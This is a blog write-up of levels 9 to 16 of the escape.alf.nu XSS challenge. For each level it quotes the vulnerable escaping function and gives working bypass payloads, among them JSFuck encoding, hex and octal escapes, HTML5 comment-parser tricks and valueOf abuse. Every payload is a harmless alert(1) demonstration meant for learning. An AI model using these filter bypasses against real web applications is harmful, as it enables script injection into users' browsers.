title: escape-Write-ups (Part 2)
date: 2014-10-12 14:00:47
tags: XSS
categories: 前端安全
---
<hr/>

##前言

这是接[上一篇](http://evilddog.github.io/2014/10/12/escape-alf-nu-write-ups-2/)的Write-up

<!--more-->

##原文

###Level 9:



```
	function escape(s) {
		// This is sort of a spoiler for the last level :-)
		if (/[\\<>]/.test(s)) return '-';
		return '<script>console.log("' + s.toUpperCase() + '")</script>';
	}
```


Some as level 8 but now we cannot use angle brackets (<>) nor backslashes (\)

Solutions:

Is it possible to use an online non-alphanumeric encoder to encode the following payload so it uses no alpha characters, angle brackets (<>) nor backslashes (\)

```
	"+alert(1))//
```

Producing a huge solution (5627):

```
	 "+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!!	[]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]))+(+!![]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([]	[[]]+[])[!+[]+!![]+!![+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])))())//
```


We can also try to use our own minimization using the letters in “false”, “true”, “undefined” and “object”:

- false => ![]
- true => !![]
- undefined => [][[]]
- NaN => +[![]]
- 0 => +[]
- 1 => +!+[]
- 2 => !+[]+!+[]
- 10 => [+!+[]]+[+[]]
- Array => []
- Number => +[]
- String => []+[]
- Boolean => ![]
- Function => []["filter"]
- eval => []["filter"]["constructor"]( CODE )()7
- window => []["filter"]["constructor"]("return this")()
来源： <http://www.jsfuck.com/>

Strings we will need:
- sort 
	[(”+!1)[3]+(”+{})[1]+(”+!0)[1]+(”+!0)[0]]
- constructor 		
	[(”+{})[5]+(”+{})[1]+(”+{}[0])[1]+(”+!1)[3]+(”+!0)[0]+(”+!0)[1]+(”+!0)[2]+(”+{})[5]+(”+!0)[0]+(”+{})[1]+(”+!0)[1]]
- alert(1) 
	(”+!1)[1] + (”+!1)[2] + (”+!1)[4] +(”+!0)[1]+(”+!0)[0]+”(1)”

We will replace the call to alert(1) in our payload:

```
	 "+alert(1))//
```

with the following one so we can simplify the encoding to encode strings.

```
	"+[]["sort"]["constructor"]("alert(1)")()//
```

Note: Many other alternatives are possible like:

```
	"+(0)['constructor']['constructor']("alert(1)")()//
```

But I found the “sort” one to be the shortest (with other 4 letter functions like “trim”)

This is a 246 characters solution:

```
	"+[][(''+!1)[3]+(''+{})[1]+(''+!0)[1]+(''+!0)[0]][(''+{})[5]+(''+{})[1]+(''+
	{}[0])[1]+(''+!1)[3]+(''+!0)[0]+(''+!0)[1]+(''+!0)[2]+(''+{})[5]+(''+!0)[0]+
	(''+{})[1]+(''+!0)[1]]((''+!1)[1] + (''+!1)[2] + (''+!1)[4] +(''+!0)[1]+
	(''+!0)[0]+"(1)")())//
```

We can improve it by defining a variable containing all our letters and then just referencing it:

```
	_=''+!1+!0+{}[0]+{} = "falsetrueundefined[object Object]"

	");_=''+!1+!0+{}[0]+{};[][_[3]+_[19]+_[6]+_[5]][_[23]+_[19]+_[10]+_[3]+
	_[5]+_[6]+_[7]+_[23]+_[5]+_[19]+_[6]](_[1]+_[2]+_[4]+_[6]+_[5]+'(1)')()//
```

Now the solution is 144 characters which is still far from the winners:

Next iteratation is to change the base payload for something sorter like window.alert(1) In chrome, we can leak a reference to window with:

```
	(0,[]["concat"])()[0]
```

So using the same strings as above we get the following 100 characters solution:

```
	");_=""+!1+!0+{}[0]+{};(0,[][_[23]+_[19]+_[10]+_[23]+_[1]+_[5]])
	()[0][_[1]+_[2]+_[4]+_[6]+_[5]](1)//
```

We are still taking too many chars for defining our alphabet. Here is where Mario surprised me once again with this tweet:

```
	");(_=!1+URL+!0,[][_[8]+_[11]+_[7]+_[8]+_[1]+_[9]])()[0][_[1]+_[2]
	+_[4]+_[38]+_[9]](1)//
```


Note that he is using !1+URL+!0 as the alphabet string and it difers for different browsers:

Firefox:

```
	_=!1+URL+!0="falsefunction URL() {
	 [native code]
	 }true"
```

Chrome:

```
	_=!1+URL+!0="falsefunction URL() { [native code] }true"
```

Other interesting Mario ’s finding is that inside with-statements, almost everything leaks [object Window] for example:

```
	with(0) x=[].sort,x()
```

###Level 10:

```
	function escape(s) {
		function htmlEscape(s) {
			return s.replace(/./g, function(x) {
			return { '<': '<', '>': '>', '&': '&', '"': '"', "'": ''' }[x] || x;
		 });
	}
	function expandTemplate(template, args) {
		return template.replace( /{(\w+)}/g,
		function(_, n) {
			return htmlEscape(args[n]);
		});
	}
		return expandTemplate(
			" \n\
    			<h2>Hello, <span id=name></span>!</h2> \n\
			 <script> \n\
				var v = document.getElementById('name'); \n\
				v.innerHTML = '<a href=#>{name}</a>'; \n\
			<\/script> \n\
   			 ",
   			 { name : s }
    		);
   	 }
```

Injection takes place in a JS string context and since “\” is not escaped in the htmlEscape function, we can use hex or octal encoding for the “<” symbol and bypass the escaping function.

Valid solutions:

```
	\x3csvg onload=alert(1)

    	\74svg onload=alert(1)

```
###Level 11:

```
	function escape(s) {
    		// Spoiler for level 2
    		s = JSON.stringify(s).replace(/<\/script/gi, '');
    		return '<script>console.log(' + s + ');</script>';
    	}
```


I’ve seen similar escaping functions in real applications, normally it is not a good idea to fix the input data, you either accept it or reject it but trying to fix it normally leads to bypasses. In this case the escape function replaces “</script” with an empty string so shortest solution is:

```
    	</</scriptscript><script>alert(1)//
```


###Level 12:

```
   	 function escape(s) {
    		// Pass inn "callback#userdata"
    		var thing = s.split(/#/);
    		if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
    		var obj = {'userdata': thing[1] };
    		var json = JSON.stringify(obj).replace(/\//g, '\\/');
    		return "<script>" + thing[0] + "(" + json +")</script>";
    	}
```


Similar to level 7 but this time the backslash is also escaped so we use a similar vector with a different way to comment the junk out:

Solution:

```
   	 '#';alert(1)<!--
```

It will render:

```
   	 <script>'({"userdata":"';alert(1)<!--"})</script>
```

###Level 13:

```
    	function escape(s) {
    		var tag = document.createElement('iframe');
    		//For this one, you get to run any code you want,but in a "sandboxed" iframe.
   		 //
    		// http://print.alf.nu/?text=... just outputs whatever you pass in.
    		//
		// Alerting from print.alf.nu won't count; try to trigger the one below.
		s = '<script>' + s + '<\/script>';
		tag.src = 'http://print.alf.nu/?html=' + encodeURIComponent(s);
		window.WINNING = function() { youWon = true; };
		tag.onload = function() {
    			f (youWon) alert(1);
    			};
    			document.body.appendChild(tag);
    		}
```


Iframes have a interesting feature: setting the name attribute on an iframe sets the name property of the iframe’s global window object to the value of that string. Now, the interesting part is that it can be done the other way around, so an iframe can define its own window.name and the new name will be injected in the parent’s global window object if it does not exist already (it cannot overwrite it). So if we fool the framed site to declare its window.name as “youWon”, a youWon variable will be setted in the parent global window object and so the “alert(1)” will be popped

Solution:

```
    	name='youWon'
```

###Level 14:

```
    	<!DOCTYPE HTML>
	function escape(s) {
		function json(s) { 
			return JSON.stringify(s).replace(/\//g, '\\/'); 
		}

		function html(s) { 
			return s.replace(/[<>"&]/g, function(s) {
				return '&#' + s.charCodeAt(0) + ';'; 
			}); 
		}
		return (
			'<script>' +
				'var url = ' + json(s) + '; 
				// We\'ll use this later ' + '</script>\n\n' +
				' <!-- for debugging -->\n' +
				' URL: ' + html(s) + '\n\n' +
				'<!-- then suddenly -->\n' +
				'<script>\n' +
				' if (!/^http:.*/.test(url)) console.log("Bad url: " + url);\n' +
				' else new Image().src = url;\n' +
			'</script>'
			);
    	}
```

In order to solve this level we need to be familiar with an HTML5 parser “feature” when dealing with comments in JS blocks. This feature is well described in this post (thanks for the hint @cgvwzq !).

The trick is that injecting an HTML5 single line comment “!—” followed by a “"script"” open tag will move the parser into the “script data double escaped state” until the closing script tag is found and then it will transition into “ script data escaped state ” and it will treat anything from the end of the string where we injected the “"!—"scrip"” as JS! only thing we need to do is making sure there is a “—>” so that the parser does not throw an invalid syntax exception.

So basically, if there is a “—>” somewhere in the code (or we can inject it) we can fool the parser into processing HTML as JS. The string where we inject “"!—"script"” will still be considered as a JS string an everything following the string will become JS.

For this level we will make the JS engine to parse the HTML part (URL: xxx). In order to do so, we will start our payload with “alert(1)” so that the first JS evaluated will be “URL: alert(1)” then we want to comment out the remaining JS code so we will insert a multi-line comment start “/ ”. This way everything else will be commented out until we reach the “ /” present in the regexp; the code from that point on will be evaluated. In order to get a valid regexp we will also inject “if(/a/” before the multi-line comment start. So our payload will look like:

```
    	alert(1);/*<!--<script>*/if(/a//*
```

The resulting code will be:

![](http://evilddog.qiniudn.com/escape.alf.nu_3.png)

Now if we clean it up and remove the comments (in grey):

```
    	<script>
    		var url = "alert(1);\/*<!--<script>*\/if(\/a\/\/*";
    		URL: alert(1); if(/a/.test(url)) console.log("Bad url: " + url);
   		 else new Image().src = url;
    	</script>
```

We can get it even shorter with:

```
    	if(alert(1)/*<!--<script>
```

This will turn into:

```
    	<script>
   	 	var url = "alert(1);\/*<!--<script>*\/if(\/a\/\/*";
    		URL: if(alert(1).test(url)) console.log("Bad url: " + url);
    		else new Image().src = url;
    	</script>
```


###Level 15:

```
    	function escape(s) {
    		return s.split('#').map(function(v) {
    			// Only 20% of slashes are end tags; save 1.2% of total
    			// bytes by only escaping those.
    			var json = JSON.stringify(v).replace(/<\//g, '<\\/');
    			return '<script>console.log('+json+')</script>';
    		}).join('');
    	}
```

We can use the same trick we used for level 14. We can start with something simple like:

```
    	payload1#payload2
```

that will render:

```
    	<script>console.log("payload1")</script>
	<script>console.log("payload2")</script>
```


We can take advantage of HTML5 “"!—"script"” trick to change the way the parser treats the code between the two blocks and inject our “alert(1)” payload. Note that this trick only works in HTML5 documents and we will need to inject a closing “—>” since it is not present in the code

The solution is:

```
    	<!--<script>#)/;alert(1)//-->

```
This will render:

Since we transition to “ script data double escaped state ” when the parser finds “<!—"script'”, the JS engine will receive the following valid JS expression:

That can be interpreted as:

```
    	console.log("junk_string") < /junk_regexp/ ; alert(1) // -->
```

Where:

```
    	junk_string: <!—<script>
    	junk_regexp: script><script>console.log(“)
```

Actually you can see in the console that the first console.log writes ‘<!—"script"’

In order to make it even shorter we can replace “//” with unicode \u2028 as suggested by Mario
###Level 16:

```
   	 function escape(text) {
   	 	// *cough* not done
    		var i = 0;
    		window.the_easy_but_expensive_way_out = function() { alert(i++) };
   	 	// "A JSON text can be safely passed into JavaScript's eval() function
    		// (which compiles and executes a string) if all the characters not
    		// enclosed in strings are in the set of characters that form JSON
    		// tokens."
    		if (!(/[^,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]/.test(
   		 text.replace(/"(\\.|[^"\\])*"/g, '')))) {
    			try {
    			var val = eval('(' + text + ')');
    			console.log('' + val);
    			} catch (_) {
   				 console.log('Crashed: '+_);
   	 			}	
    			} else {
    		console.log('Rejected.');
    		}
    	}
```

This level is based on a real world filter described by Stefano Di Paola in this post

If we study the regexp carefully we will see that the letter “s” is allowed since its within the “u-r” interval, that allows us to use the word “self” and with that we can craft a valid JSON payload. The trick is that we will be adding “0” to our object so the JS engine will need to calculate the valueOf our object. So if we define the “valueOf” function as the “the_easy_but_expensive_way_out” global function, we will be able to invoke it during the arithmetic operation. The problem is that it will alert “0” since “i” its initialized with “0”, but we can do it twice to alert a “1”.

Long Solution:

```
	{	
		"valueOf":self["the_easy_but_expensive_way_out"]
	}+0,
		"valueOf":self["the_easy_but_expensive_way_out"]
	}
```

That is a nice trick to execute a function when parenthesis are not allowed. But there some more like Gareth famous one:

```
    	onerror=eval;throw['=1;alert\x281\x29']
```

You can get a shorter solution for IE only as explained by Stefano Di Paola in his post

```
	{
		"valueOf":self["location"],"toString":[]["join"],
		0:"javascript:alert(1)","length":1
	}
```

And thats all folks, thanks for reading!

##[Part1](http://evilddog.github.io/2014/10/12/escape-alf-nu-write-ups-2/)
